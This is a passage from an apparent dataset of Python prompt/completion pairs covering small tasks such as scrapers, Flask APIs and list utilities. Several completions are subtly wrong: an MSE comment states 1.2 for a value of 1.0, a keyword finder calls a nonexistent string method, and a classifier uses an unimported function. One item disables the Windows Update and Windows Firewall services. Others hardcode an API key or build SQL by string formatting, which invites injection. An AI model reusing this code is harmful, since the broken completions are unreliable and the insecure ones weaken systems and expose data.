forecast for the weekend in New York City?","completion":"import requests def get_weather(city): url = 'http://api.openweathermap.org/data/2.5/weather?q={}&units=imperial&appid=c2e5d854b5f0820c9e02e76bc5ad7e9f'.format(city) r = requests.get(url) data = r.json() if data['cod'] != '404': temp = data['main']['temp'] desc = data['weather'][0]['description'] return 'The Temperature in {} is {}, {}'.format(city, temp, desc) else: return 'City not found!' while True: city = raw_input('Enter the name of a city: ') print(get_weather(city))"},{"prompt":"Design a REST API with Python and Flask for a ticket reservation system that allows customers to view available tickets, create reservations, and cancel reservations. Not applicable","completion":"from flask import Flask, request, jsonify app = Flask(__name__) @app.route('/tickets', methods=['GET']) def get_tickets(): # Get the list of available tickets tickets = get_available_tickets() return jsonify(tickets) @app.route('/tickets/<ticket_id>', methods=['POST']) def create_reservation(ticket_id): # Create a reservation for the specified ticket reservation = create_reservation(ticket_id) return jsonify(reservation) @app.route('/tickets/<ticket_id>', methods=['DELETE']) def cancel_reservation(ticket_id): # Cancel the specified reservation deleted = cancel_reservation(ticket_id) return jsonify(deleted) if __name__ == '__main__': app.run()"},{"prompt":"The code provided is a Python module that contains functions for loading and saving data from an HDF5 file to an SDF file format. The load function takes two arguments, the filename of the HDF5 file and the name of the object to load from the file. It returns an SDF group or dataset object depending on the type of object loaded from the HDF5 file. The save function takes two arguments, the filename of the SDF file to save to and the SDF group object to save. It converts the SDF group object and its child datasets to HDF5 format and saves them to the specified file.","completion":"# Copyright (c) 2019 Dassault Systemes. All rights reserved. import h5py import sdf import numpy as np import os import sys def _to_python_str(s): \\"\\"\\" Convert to Python string \\"\\"\\" if isinstance(s, bytes): return s.decode('utf-8') else: return s def load(filename, objectname): with h5py.File(filename, 'r') as f: datasets = {} dsobj = f[objectname] class_name = dsobj.__class__.__name__ if class_name == 'Group': group = _create_group(dsobj, datasets) _restore_scales(datasets) return group elif class_name == 'Dataset': dataset = _create_dataset(dsobj, datasets) for ri in range(dsobj.ndim): if dsobj.dims[ri]: sobj = dsobj.dims[ri][0] s = _create_dataset(sobj, dict()) s.is_scale = True dataset.scales[ri] = s return dataset else: raise Exception('Unexpected object') def save(filename, group): with h5py.File(filename, 'w') as f: datasets = dict() _write_group(f, group, '/', datasets) # attach the scales for ds, h5ds in datasets.items(): for i, s in enumerate(ds.scales): if s is None: continue elif s in datasets: h5s = datasets[s] dimname = s._display_name if dimname is None: dimname = '' h5s.make_scale(_str(dimname)) h5ds.dims[i].attach_scale(h5s) else: print(\\"Cannot attach scale for '\\" + h5ds.name + \\"' because the referenced scale for dimension \\" + str(i) + \\" is not part of the file\\") def _create_group(gobj, datasets): \\"\\"\\" Create an sdf.Group from an h5py group \\"\\"\\" ds_obj_list = [] g_obj_list = [] group_attrs = {key: gobj.attrs[key] for key in gobj.attrs.keys() if key != 'COMMENT'} comment = gobj.attrs.get('COMMENT') for ds_name in gobj.keys(): # TODO: fix this? if isinstance(gobj[ds_name], h5py._hl.dataset.Dataset): ds_obj_list.append(gobj[ds_name]) elif isinstance(gobj[ds_name], h5py._hl.group.Group): g_obj_list.append(gobj[ds_name]) child_groups = [] for cgobj in g_obj_list: child_groups.append(_create_group(cgobj, datasets)) ds_list = [_create_dataset(dsobj, datasets) for dsobj in ds_obj_list] name = gobj.name.split('/')[-1] return sdf.Group(name=name, comment=comment, attributes=group_attrs, groups=child_groups, datasets=ds_list) def _create_dataset(dsobj, datasets): \\"\\"\\" Create a dataset from an h5py dataset \\"\\"\\" _, name = os.path.split(dsobj.name) ds = sdf.Dataset(name, data=dsobj[()]) for attr in dsobj.attrs: if attr == 'COMMENT': ds.comment = _to_python_str(dsobj.attrs[attr]) elif attr == 'NAME': ds.display_name = _to_python_str(dsobj.attrs[attr]) elif attr == 'RELATIVE_QUANTITY' and _to_python_str(dsobj.attrs[attr]) == 'TRUE': ds.relative_quantity = True elif attr == 'UNIT': ds.unit = _to_python_str(dsobj.attrs[attr]) elif attr == 'DISPLAY_UNIT': ds.display_unit = _to_python_str(dsobj.attrs[attr]) elif attr == 'CLASS' and _to_python_str(dsobj.attrs[attr]) == 'DIMENSION_SCALE': ds.is_scale = True elif attr == 'REFERENCE_LIST': ds.is_scale = True elif attr in ['REFERENCE_LIST', 'DIMENSION_LIST']: pass else: ds.attributes[attr] = _to_python_str(dsobj.attrs[attr]) ds.scales = [None] * ds.data.ndim datasets[dsobj] = ds return ds def _restore_scales(datasets): for dsobj, ds in datasets.items(): for i in range(ds.data.ndim): if dsobj.dims[i]: sobj = dsobj.dims[i][0] scale = datasets[sobj] scale.is_scale = True ds.scales[i] = scale pass def _str(s): \\"\\"\\" Convert to byte string \\"\\"\\" if sys.version_info.major >= 3 and isinstance(s, bytes): return s else: # convert the string to an fixed-length utf-8 byte string return np.string_(s.encode('utf-8')) def _write_group(f, g, path, datasets): if path == '/': gobj = f else: gobj = f.create_group(path) # iterate over the child groups for subgroup in g.groups: _write_group(f, subgroup, path + subgroup.name + '/', datasets) if g.comment is not None: gobj.attrs['COMMENT'] = _str(g.comment) for key, value in g.attributes.items(): gobj.attrs[key] = _str(value) # write the datasets for ds in g.datasets: _write_dataset(f, ds, path, datasets) def _write_dataset(f, ds, path, datasets): f[path + ds.name] = ds.data dsobj = f[path + ds.name] datasets[ds] = dsobj if ds.comment: dsobj.attrs['COMMENT'] = _str(ds.comment) if ds._display_name: dsobj.attrs['NAME'] = _str(ds.display_name) if ds.relative_quantity: dsobj.attrs['RELATIVE_QUANTITY'] = _str('TRUE') if ds.unit: dsobj.attrs['UNIT'] = _str(ds.unit) if ds.display_unit != ds.unit: dsobj.attrs['DISPLAY_UNIT'] = _str(ds.display_unit) if ds.is_scale: dimname = ds.display_name if dimname is None: dimname = '' h5py.h5ds.set_scale(dsobj.id, _str(dimname)) return dsobj"},{"prompt":"Create a Bitcoin wallet application using Python. This application should have endpoints for creating a wallet, sending coins to another wallet, and retrieving the balance of a wallet. Wallet address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfN","completion":"import hashlib import base58 class BitcoinWallet: def __init__(self): self.address = None self.public_key = None self.private_key = None self.balance = 0 def generate_keys(self): priv_key = hashlib.sha256(os.urandom(64)).hexdigest() public_key = hashlib.sha256(priv_key.encode('utf-8')).hexdigest() self.private_key = priv_key self.public_key = public_key self.address = self.generate_address() def generate_address(self): address = hashlib.new('ripemd160', self.public_key.encode('utf-8')).hexdigest() address_encoded = base58.b58encode_check(address) return address_encoded def send_coins(self, recipient, amount): ... def check_balance(self): ..."},{"prompt":"Design an algorithm in Python which takes a given 2D array and finds the product of the elements in each row. [[1, 2], [3, 4]]","completion":"def rowProduct(arr): result = [] for row in arr: product = 1 for num in row: product = product * num result.append(product) return result arr = [[1, 2], [3, 4]] result = rowProduct(arr) print(result)"},{"prompt":"Write a Python script for automatically disabling a set of services in Windows. Services to be disabled: Windows Update, Windows Firewall Setup","completion":"import win32com.client #provide list of services to be disabled disableservices = [\\"Windows Update\\",\\"Windows Firewall Setup\\"] #connect to windows services services = win32com.client.Dispatch(\\"WbemScripting.SWbemLocator\\").ConnectServer(\\".\\",\\"rootcimv2\\").ExecQuery(\\"Select * from Win32_Service\\") for service in services: #iterate over the list and deactivate the services if service.Name in disableservices: service.Stopservice() print(\\"Successfully disabled \\",service.Name)"},{"prompt":"Create a command line tool in Python. The tool should take a URL as an input and print out which links on the page are most frequently clicked. https://www.example.com/","completion":"import bs4 import requests from collections import defaultdict url = 'https://www.example.com/' source = requests.get(url).text soup = bs4.BeautifulSoup(source, 'lxml') links_clicks = defaultdict(int) for link in soup.find_all('a'): href = link.get('href') links_clicks[href] += 1 sort_clicks = sorted(links_clicks.items(), key=lambda x: x[1], reverse=True) for link, clicks in sort_clicks: print(f'{link} clicks: {clicks}')"},{"prompt":"This code audits a user table and compares the current date to the last password update. If the last update exceeds the threshold, it sends a notice to the users. To use this code, define the imported libraries, turn the mail function on or off, define today and lookback day, define msg as multipart, application, and message to be sent to listed users, connect to the MySQL database, query the user table, format the data so it is in readable columns, send an email to the users displayed, close the database connection, and print the done message.","completion":"#!/usr/bin/python2.7 -Wd ''' file:user_audit.py use: audits users table and compares current date to last password update if last update exceeds threshold send a notice to users author: ty.talmadge@gmail.com date: 20131002 connector: mysqldb because the SQL only changes per table layout ''' # define imported libraries import datetime,MySQLdb,smtplib # import mimetext if you want to include a copy of the password update policy from email.mime.text import MIMEText # turn mail function off and on # 0 is off 1 is on mail_on=0 # define today and lookback day lookback_days=90 today_day=datetime.datetime.today() today_holdout=datetime.date.today() day_format=\\"%Y-%m-%d\\" hour_format=\\"%H:%M:%S\\" this_day=today_day.strftime(day_format) this_hour=today_day.strftime(hour_format) today=\\"%s %s\\" % (this_day,this_hour) lookback=datetime.timedelta(days=lookback_days) holdout=today_holdout-lookback threshhold_d=\\"%s %s\\" % (holdout,this_hour) threshhold=str(threshhold_d) # define msg as multipart, application and message to be sent to listed users audit_file=\\"/path/to/audit_message.txt\\" ap=open(audit_file, 'rb') msg=MIMEText(ap.read()) ap.close() me='application_name@mycompany.com' application_name='Your_Application' #connect to mysql database audit_db = MySQLdb.connect(host=\\"localhost\\",user=\\"some_user\\",passwd=\\"some_password\\",db=\\"some_db_schema\\") # create cursor object cursor = audit_db.cursor() # query user table cursor.execute(\\"select name,full_name,password_created,email from users where password_created < '%s' order by name asc\\" % threshhold) print \\"Auditing users starting %s and looking back %s days to %s.n\\" % (today,lookback_days,threshhold) print \\"The following users have not updated their passwords in the last %s days.n \\" % lookback_days # echo results if running in a scheduler, i.e. Control-M, Open-Scheduler, etc. so they will appear in sysout # format the data so it is in readable columns for row in cursor.fetchall(): pw_format=str(row[2]) if mail_on == '0': # send an email to the users displayed msg['Subject']='Password update reminder from %s' % application_name msg['From']=me msg['To']=row[3] sendme=smtplib.SMTP('mail_server') sendme=sendmail(me,[row[3]], msg.as_string()) sendme.quit() else: print row[0].ljust(30), \\" \\", row[1].ljust(30), \\" \\",pw_format.ljust(30), \\" \\", row[3].ljust(30) # close the database connection audit_db.close() # print the done message print \\"nFinished auditing user table.n\\""},{"prompt":"Write a Python code for extracting numbers from a given text.","completion":"import re def extract_numbers(input_string): \\"\\"\\"This function extracts numbers from a given textstring using regular expressions.\\"\\"\\" # Compile the regular expression pattern = re.compile(r'd+') # Find all numbers in the string output_list = pattern.findall(input_string) return output_list # Sample Input input_string = 'I have 2 cats and 3 dogs' # Print the output print(extract_numbers(input_string))"},{"prompt":"Write a Python program which prints the index of the given value in a list. my_list = [2, 4, 6, 8] value = 4","completion":"def find_index(my_list, value): for i in range(len(my_list)): if my_list[i] == value: return i"},{"prompt":"Generate a code snippet to convert a string to an integer in Python. str = 145","completion":"num = int(str) print(num) # Prints 145"},{"prompt":"Write a python program to calculate the Mean Squared Error (MSE) loss between the predicted output and the actual output. Actual Output: [1, 2, 3, 4, 5] Predicted Output: [2, 3, 4, 5, 6]","completion":"mse_loss = ((1-2)**2 + (2-3)**2 + (3-4)**2 + (4-5)**2 + (5-6)**2)/5 print(mse_loss) # Output: 1.2"},{"prompt":"Design a function in Python that takes a list of numbers as a parameter and returns the largest number in the list.","completion":"def getLargestNum(nums): largestNum = nums[0] for num in nums[1:]: if num > largestNum: largestNum = num return largestNum"},{"prompt":"Create a function in Python that takes two strings as parameters and returns true if one string is the reverse of the other.","completion":"def is_reverse(string1, string2): return string1[::-1] == string2"},{"prompt":"Write a Python program to find out the number of days in a given year between two dates. Date 1: 04/10/2019 Date 2: 10/11/2020","completion":"\\"\\"\\" Write a Python program to find out the number of days in a given year between two dates \\"\\"\\" import datetime def find_days(date1, date2): date1 = datetime.datetime.strptime(date1, \\"%d/%m/%Y\\") date2 = datetime.datetime.strptime(date2, \\"%d/%m/%Y\\") delta = date2 - date1 return delta.days if __name__ == '__main__': date1 = '04/10/2019' date2 = '10/11/2020' result = find_days(date1, date2) print(result)"},{"prompt":"Develop a code in Python to compare two lists and remove the common elements list1 = [10, 15, 20, 25, 30, 35, 40] list2 = [25, 40, 35]","completion":"list1 = [10, 15, 20, 25, 30, 35, 40] list2 = [25, 40, 35] def remove_common_elements(list1, list2): list1_unique = [] for i in list1: if i not in list2: list1_unique.append(i) return list1_unique print(remove_common_elements(list1, list2))"},{"prompt":"Create a python class called Student that can store students' information, such as name, gender, and age.","completion":"class Student(): def __init__(self, name, gender, age): self.name = name self.gender = gender self.age = age def get_name(self): return self.name def get_gender(self): return self.gender def get_age(self): return self.age"},{"prompt":"Compose a Python program to generate a list of numbers from 1 to 50.","completion":"number_list = [i for i in range(1, 51)] print(number_list)"},{"prompt":"Create a simple program in Python that prints out the first n fibonacci numbers.","completion":"def fibonacci(n): if n<0: print(\\"Incorrect input\\") # First Fibonacci number is 0 elif n==1: return 0 # Second Fibonacci number is 1 elif n==2: return 1 else: return fibonacci(n-1)+fibonacci(n-2) # Driver Program nterms = 4 for i in range(nterms): print(fibonacci(i))"},{"prompt":"Write a function in Python to identify all the keywords present in a given sentence. Sentence: I like to eat apple","completion":"def find_keywords(sentence): keywords = set() words = sentence.split(' ') for word in words: if word.iskeyword(): keywords.add(word) return list(keywords)"},{"prompt":"Design a program in Python to filter a given array of integers and output only the even numbers. arr = [2, 7, 3, 4, 8, 9, 10]","completion":"def filterEvenNo(arr): # return a list containing only even numbers return [num for num in arr if num % 2 == 0]"},{"prompt":"Write a Python program for optimizing a web page for speed. The program should use the PageSpeed Insights API to identify page resource optimization opportunities. Not applicable","completion":"import requests import json API_KEY = \\"YOUR_API_KEY\\" def get_website_score(website): url = f'https://www.googleapis.com/pagespeedonline/v5/runPagespeed?url={website}&key={API_KEY}&strategy=mobile' response = requests.get(url) if response.status_code == 200: ps_data = json.loads(response.content.decode('utf-8')) return ps_data['lighthouseResult']['categories']['performance']['score']*100 else: return 'unable to get website score'"},{"prompt":"Create an algorithm in Python that takes a string as an input and returns all its anagrams in alphabetical order. word","completion":"def getAnagrams(word): alphabet = list(word) anagrams = [] def getPermutations(alphabet): if len(alphabet) == 0: anagrams.append(''.join(permutation)) return for i in range(len(alphabet)): character = alphabet[i] permutation.append(character) getPermutations(alphabet[:i] + alphabet[i+1:]) permutation.pop() permutation = [] getPermutations(alphabet) return sorted(anagrams) print(getAnagrams('word'))"},{"prompt":"Write a web scraper in Python to fetch the title, rating and synopsis of the first 10 movies from IMDB","completion":"import requests from bs4 import BeautifulSoup url = \\"https://www.imdb.com/chart/top\\" response = requests.get(url) soup = BeautifulSoup(response.text, \\"html.parser\\") for movie in soup.find_all(\\"td\\", class_=\\"titleColumn\\"): title = movie.find(\\"a\\").text rating = float(movie.find(\\"strong\\").text) synopsis = movie.find(\\"span\\", class_=\\"outline\\").text print(\\"Title: {}nRating: {}nSynopsis: {}n\\".format(title, rating, synopsis))"},{"prompt":"Create a Python function to calculate the cost of a pizza. The function should take in the size of the pizza in inches and return the total cost. Size (in inches): 14","completion":"def pizzaCost(size): cost = 0 if size == 14: cost = 10.00 elif size == 16: cost = 12.50 elif size == 18: cost = 15.00 else: cost = \\"Unknown size\\" return cost print(pizzaCost(14)) // Output: 10.00"},{"prompt":"Create a program in Python using pygame library to build a simple game","completion":"import pygame # Define some colors BLACK = (0, 0, 0) WHITE = (255, 255, 255) # Call this function so the Pygame library can initialize itself pygame.init() # Create an 800x600 sized screen screen = pygame.display.set_mode([800, 600]) # Set the title of the window pygame.display.set_caption('My Game') clock = pygame.time.Clock() # Set positions of graphics background_position = [0, 0] # Load and set up graphics. background_image = pygame.image.load(\\"image.jpg\\").convert() # Set positions of graphics player_image = pygame.image.load(\\"player.jpg\\").convert() player_position = [100,100] #Iterate through the loop until the user clicks the close button. done = False while not done: # --- Event Processing for event in pygame.event.get(): if event.type == pygame.QUIT: done = True # --- Drawing Code # First, clear the screen to white. screen.fill(WHITE) #Draw the background screen.blit(background_image, background_position) #Draw the character screen.blit(player_image, player_position) # Go ahead and update the screen with what we've drawn. pygame.display.flip() # Limit frames per second clock.tick(60) # Be IDLE friendly pygame.quit()"},{"prompt":"Create a Python program that takes a string input and for each line prints the length of the line, the longest/shortest word in the line, and the average word length. The quick brown fox jumps over the lazy dog.","completion":"# take input as a string text = 'The quick brown fox jumps over the lazy dog.' # loop through lines for line in text.splitlines(): # get line stats line_length = len(line) words = line.split() longest_word_length = len(max(words)) shortest_word_length = len(min(words)) average_word_length = line_length / len(words) # print line stats print(\\"Line length:\\", line_length) print(\\"Longest word length:\\", longest_word_length) print(\\"Shortest word length:\\", shortest_word_length) print(\\"Average word length:\\", average_word_length) print()"},{"prompt":"Create a web service in Python that provides a list of prime numbers given a range. Lower Limit: 2 Upper Limit: 11","completion":"from flask import Flask, request, jsonify app = Flask(__name__) @app.route('/prime_numbers', methods=['GET']) def prime_numbers(): lower_limit = request.args.get('lower_limit') upper_limit = request.args.get('upper_limit') prime_nums = [] for num in range(int(lower_limit), int(upper_limit)+1): if num > 1: for i in range(2,num): if (num % i) == 0: break else: prime_nums.append(num) return jsonify(prime_nums) if __name__ == '__main__': app.run()"},{"prompt":"Generate a Python program to compare two strings.","completion":"def compare_strings(str1, str2): if len(str1) == len(str2): for char in str1: if not char in str2: return False return True else: return False str1 = \\"foo\\" str2 = \\"bar\\" print(compare_strings(str1, str2))"},{"prompt":"Construct a program in Python to find all the possible substrings of a given string.","completion":"def find_substrings(string): # Create an empty list to store all the possible substrings substrings = [] # Iterate through each character of the string for i in range(len(string)): for j in range(i, len(string)): substrings.append(string[i: j + 1]) return substrings"},{"prompt":"This code is a Python program that scrapes the ESPN FC website for content. To run the program, you need to import the necessary libraries, set the output path for Windows or Mac environments, and define the team URLs. The program will then parse the team news for each team URL and output the results to a text file. To download images, use the downloadImage function.","completion":"# -*- coding: utf-8 -*- ''' Created on Jan 30, 2015 Modified on Jan 30, 2015 @author: rainier.madruga@gmail.com A simple Python Program to scrape the ESPN FC website for content. ''' ''' Version Number of Script ''' version = '0.01.a' # Import Libraries needed for Scraping the various web pages from bs4 import BeautifulSoup import urllib2 import datetime import requests import os import platform import sys reload(sys) sys.setdefaultencoding('utf-8') # Establish the process Date & Time Stamp ts = datetime.datetime.now().strftime(\\"%H:%M:%S\\") ds = datetime.datetime.now().strftime(\\"%Y-%m-%d\\") date = datetime.datetime.now().strftime(\\"%Y%m%d\\") # Updates the Time Stamp def updateTS(): update = datetime.datetime.now().strftime(\\"%H:%M:%S\\") return update # Download Image def downloadImage(imageURL, localFileName): response = requests.get(imageURL) if response.status_code == 200: print 'Downloading %s...' % (localFileName) with open(localFileName, 'wb') as fo: for chunk in response.iter_content(4096): fo.write(chunk) return True # Program Version & System Variables parseVersion = 'ESPN Premier League Team News ' + version print ds + ' :: ' + ts + ' :: ' + parseVersion # Set Output Path for Windows or Mac environments os_System = platform.system() win_BasePath = \\"C:/Users/Rainier/Documents/GitHub/python-soccer\\" if os_System == \\"Windows\\": outputPath = win_BasePath + \\"/PL-Data/\\" outputImgPath = win_BasePath + \\"/PL-Data/imgs/\\" outputTeamPath = win_BasePath + \\"/PL-Data/teams/\\" outputMatchPath = win_BasePath + \\"/PL-Data/match/\\" else: outputPath = 'PL-Data/' outputImgPath = 'PL-Data/imgs/' outputTeamPath = 'PL-Data/teams/' outputMatchPath = 'PL-Data/match/' hr = \\" >>> *** ====================================================== *** <<<\\" shr = \\" >>> *** ==================== *** <<<\\" prefixBBC = \\"http://www.bbc.com\\" prefixESPN = \\"http://www.espnfc.us\\" teamURLs = ['/club/arsenal/359/index','/club/aston-villa/362/index','/club/burnley/379/index','/club/chelsea/363/index','/club/crystal-palace/384/index','/club/everton/368/index','/club/hull-city/306/index','/club/leicester-city/375/index','/club/liverpool/364/index','/club/manchester-city/382/index','/club/manchester-united/360/index','/club/newcastle-united/361/index','/club/queens-park-rangers/334/index','/club/southampton/376/index','/club/stoke-city/336/index','/club/sunderland/366/index','/club/swansea-city/318/index','/club/tottenham-hotspur/367/index','/club/west-bromwich-albion/383/index','/club/west-ham-united/371/index'] def teamNews(x): teamURL = x teamName = x teamName = teamName[6:len(teamName)-10] teamURL = prefixESPN + teamURL teamHTML = urllib2.urlopen(teamURL) teamSoup = BeautifulSoup(teamHTML) recentNews = teamSoup.find(\\"div\\", {\\"id\\":\\"feed\\"}) recentNewsItems = recentNews.find_all(\\"div\\", {\\"class\\":\\"feed-item-content\\"}) recapOutput = [] print \\"Team News Parsed :: \\" + teamName for i in recentNewsItems: recapPhotoItem = i.find(\\"div\\", {\\"class\\":\\"thumbnail picture\\"}) if len(i) > 3: # recapPhotoItem = recapPhotoItem.find(\\"img\\") # print recapPhotoItem[\\"src\\"] # with open(outputTxt, \\"a\\") as f: # f.write('n' + shr + 'n') # f.write(i.prettify()) # f.write('n' + shr + 'n') # f.close() # print shr recapHeadline = i.find(\\"h2\\") recapHeadlineDetails = recapHeadline.find(\\"a\\") recapHeadlineDetails = recapHeadlineDetails[\\"href\\"] recapHeadline = recapHeadline.get_text(strip=True) recapAge = i.find(\\"span\\", {\\"class\\":\\"age\\"}) recapAge = recapAge.get_text(strip=True) recapOutput.append(date + \\"|\\" + teamName + \\"|\\" + recapHeadline + \\"|\\" + recapHeadlineDetails + \\"|\\" + recapAge) #print shr # print i.prettify() #print recapHeadlineDetails #print shr #recapDetails = recapHeadline.find(\\"a\\") #recapDetails = recapDetails[\\"href\\"] #print recapDetails # print recapAge.get_text(strip=True) #print updateTS() #print shr # print i else: #print i #print shr recapGameOpponents = i.find_all(\\"div\\", {\\"class\\":\\"team-name\\"}) recapGameScore = i.find_all(\\"div\\", {\\"class\\":\\"team-score\\"}) recapGameStatus = i.find(\\"div\\", {\\"class\\":\\"game-info\\"}) recapGameHome = recapGameOpponents[0].get_text(strip=True) recapGameAway = recapGameOpponents[1].get_text(strip=True) recapHomeScore = recapGameScore[0].get_text(strip=True) recapAwayScore = recapGameScore[1].get_text(strip=True) #recapGameInfo = i.find(\\"div\\", {\\"clas=\\":\\"game-info\\"}) recapOutput.append(date + \\"|\\" + teamName + \\"|\\" + recapGameHome + \\" \\" + recapHomeScore + \\" v. \\" + recapAwayScore + \\" \\"+ recapGameAway + \\"||\\") # print i for i in recapOutput: print i print hr return recapOutput teamNewstxt = 'teamNews.txt' with open(teamNewstxt, \\"w\\") as f: f.write(ds + \\" :: \\" + updateTS() + \\" :: \\" + parseVersion + 'n' ) f.close() for i in teamURLs: for x in teamNews(i): with open(teamNewstxt, \\"a\\") as f: f.write(x + 'n') f.close()"},{"prompt":"Convert the given code from JS to Python. let add = (a, b) => { return a + b; }","completion":"def add(a, b): return a + b"},{"prompt":"Create an AI chatbot in Python to answer simple user questions about a specific topic.","completion":"# import libraries import random import nltk from nltk.corpus import wordnet # define a function to find the synonym of a given word def get_synonym(word): synonyms = set() for syn in wordnet.synsets(word): for l in syn.lemmas(): synonyms.add(l.name()) if word in synonyms: synonyms.remove(word) return list(synonyms) # define a function to generate a response def bot_response(question): responses = [\\"I'm not sure I understand, could you rephrase the question?\\", \\"I don't have enough information to answer that question, can you give me more data?\\", \\"I'm not sure I can help you with that.\\", \\"Can you rephrase the question?\\", \\"What would you like to know?\\"] # tokenize the sentence tokens = nltk.word_tokenize(question) # look for a synonym of each word synonyms_list = [] for word in tokens: synonyms_list.append(get_synonym(word)) # generate a response with synonyms of each word response_tokens = [] for synonyms in synonyms_list: if len(synonyms) > 0: response_tokens.append(random.choice(synonyms)) else: response_tokens.append(word) response = ' '.join(response_tokens) # if not, randomly select one of the predefined responses if not response: response = random.choice(responses) return response"},{"prompt":"Write Python code to implement a class like this. class Employee: def __init__(self, name, age): self.name = name self.age = age","completion":"class Employee: def __init__(self, name, age): self.name = name self.age = age def __str__(self): return \\"Employee({0}, {1})\\".format(self.name,self.age) emp = Employee(\\"John\\", 24) print(emp)"},{"prompt":"Generate a program in Python to take the inputted text content and modify it into a valid Python program content = print('hello world')","completion":"def parse_to_python(content): ''' This function takes a text content and modifies it into a valid Python program. Parameters ---------- content : str Text content to be modified Returns ------- Str Modified content as a Python program. ''' # Create a python program from content content_list = content.split(\\"'\\") content_list[0] = content_list[0] + \\"\\"\\" content_list[-1] = \\"\\"\\" + content_list[-1] content = \\"\\".join(content_list) content = \\"import sysnif __name__ == \\"__main__\\":ntsys.stdout.write(\\" + content + \\")\\" # Return modified content as python program return content"},{"prompt":"Generate a Python program which reads a string as input and removes all vowels present in the string and print out the revised string. apple","completion":"def removeVowels(string): vowels = ('a', 'e', 'i', 'o', 'u') revised_string = \\"\\" for letter in string: if letter.lower() not in vowels: revised_string += letter return revised_string string = \\"apple\\" reviseString = removeVowels(string) print(\\"Revised string =\\", reviseString)"},{"prompt":"Write a Python program to add two matrices of different sizes. matrix1 = [[1, 2], [3, 4]] matrix2 = [[5, 6, 7], [8, 9, 10], [1, 4, 6]]","completion":"def add_matrix(m1, m2): row1 = len(m1) col1 = len(m1[0]) row2 = len(m2) col2 = len(m2[0]) row = min(row1, row2) col = min(col1, col2) # result stores the addition of the two matrices result = [[0 for j in range(col)] for i in range(row)] for i in range(row): for j in range(col): result[i][j] = m1[i][j] + m2[i][j] return result m1 = [[1,2], [3,4]] m2 = [[5,6,7], [8,9,10], [1,4,6]] result = add_matrix(m1, m2) print(result)"},{"prompt":"Design an algorithm in Python to check if an integer is even or odd. n = 5","completion":"def check_number(n): if n%2==0: return \\"Even\\" else: return \\"Odd\\" check_number(5) # Output: Odd"},{"prompt":"Generate a list comprehension of python that adds two to each element of a given list. list = [1, 2, 3, 4]","completion":"list = [x+2 for x in [1, 2, 3, 4]]"},{"prompt":"Generate a Python program which returns the most recognized word in a given list of strings. [Hello, Hi, Greeting]","completion":"def most_recognized(strings): max_string = \\"\\" max_count = 0 for string in strings: count = len(string.split()) if count > max_count: max_string = string max_count = count return max_string strings = [\\"Hello\\", \\"Hi\\", \\"Greeting\\"] most_recognized_word = most_recognized(strings) print(f\\"Most recognized word: {most_recognized_word}\\")"},{"prompt":"Create a Python program that uses a pretrained machine learning model to classify text. Not applicable","completion":"import numpy as np import pandas as pd from sklearn.feature_extraction.text import CountVectorizer from sklearn.model_selection import train_test_split from sklearn.preprocessing import LabelEncoder from sklearn.svm import LinearSVC # Create training and test sets data = pd.read_csv('data.csv', sep=',') X_train, X_test, y_train, y_test = train_test_split(data['text'], data['label']) # Create vocab features vectorizer = CountVectorizer(stop_words=\\"english\\") vectorizer.fit(X_train) X_train_vector = vectorizer.transform(X_train) X_test_vector = vectorizer.transform(X_test) # Train the model model = LinearSVC() model.fit(X_train_vector, y_train) # Make predictions on the test set y_pred = model.predict(X_test_vector) # Evaluate the model accuracy = accuracy_score(y_test, y_pred) print(\\"Model accuracy: {}\\".format(accuracy))"},{"prompt":"Create a function in Python which takes in a number n and returns Fizz if the number is divisible by 3, Buzz if the number is divisible by 5, and FizzBuzz if the number is divisible by both 3 and 5. Number: 15","completion":"def fizzbuzz(n): if n % 3 == 0 and n % 5 == 0: return 'FizzBuzz' elif n % 3 == 0: return 'Fizz' elif n % 5 == 0: return 'Buzz' else: return n"},{"prompt":"Develop a program in Python to calculate the areas of different shapes. Not applicable","completion":"def calculate_area(shape): \\"\\"\\" Calculates the area of the given shape. Parameters ---------- shape: string The name of the shape to calculate the area for Returns ------- float The area of the given shape \\"\\"\\" if shape == \\"rectangle\\": length = float(input(\\"Enter the length of the rectangle: \\")) width = float(input(\\"Enter the width of the rectangle: \\")) area = length * width return area elif shape == \\"triangle\\": base = float(input(\\"Enter the base of the triangle: \\")) height = float(input(\\"Enter the height of the triangle: \\")) area = (base * height) / 2 return area elif shape == \\"circle\\": radius = float(input(\\"Enter the radius of the circle: \\")) area = 3.14159265358979 * (radius * radius) return area else: return \\"This shape is not supported\\""},{"prompt":"Develop a basic web scraper in Python to scrape the text of Wikipedia articles. A URL of any Wikipedia page, for example, https://en.wikipedia.org/wiki/Google.","completion":"import requests from bs4 import BeautifulSoup # Make an HTTP GET request to the Wikipedia page url = \\"https://en.wikipedia.org/wiki/Google\\" response = requests.get(url) # Parse the response HTML soup = BeautifulSoup(response.text, \\"html.parser\\") # Extract the raw content of the Wikipedia page content = soup.find(\\"div\\", {\\"id\\": \\"mw-content-text\\"}).text print(content)"},{"prompt":"Develop a python program for predicting house prices. The input dataset contains a collection of 248 house prices from a neighborhood in the United States. Each house price is associated with 6 different attributes.","completion":"import pandas as pd # Load the input dataset data = pd.read_csv(\\"data.csv\\") # Split into X and y X = data.iloc[:,0:6] y = data.iloc[:,6] # Build the model from sklearn.linear_model import LinearRegression model = LinearRegression() model.fit(X,y) # Make predictions predictions = model.predict(X)"},{"prompt":"Write a Python program to find the maximum length of consecutive 1s in a binary array. Array = [1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0]","completion":"def find_max_consecutive_1s(Array): max_count = 0 count = 0 for i in Array: if i == 1: count += 1 max_count = max(max_count, count) else: count = 0 return max_count"},{"prompt":"Create a Python program that takes an address as an input and returns the latitude and longitude of the address. 2100 Pennsylvania Ave NW Washington D.C. 20006","completion":"import requests def get_coordinates(address): api_key = \\"insert your API key here\\" url = \\"https://maps.googleapis.com/maps/api/geocode/json?address=\\" + address + \\"&key=\\" + api_key response = requests.get(url) result = response.json() if result['status'] == 'OK': latitude = result['results'][0]['geometry']['location']['lat'] longitude = result['results'][0]['geometry']['location']['lng'] return latitude, longitude"},{"prompt":"Write a function in Python which takes one string as input and checks if the string starts with a vowel. String abc","completion":"def start_vowel(input_string): vowel_list = [\\"a\\", \\"e\\", \\"i\\", \\"o\\", \\"u\\"] if input_string[0] in vowel_list: print(\\"String starts with a vowel\\") else: print(\\"String does not start with a vowel\\") start_vowel(\\"abc\\")"},{"prompt":"Write a function to tokenize a sentence using NLTK library in Python. Not applicable","completion":"# Solution # First, let's import NLTK library import nltk # Define our sentence to tokenize sentence = 'This is a test sentence.' # Tokenize the sentence 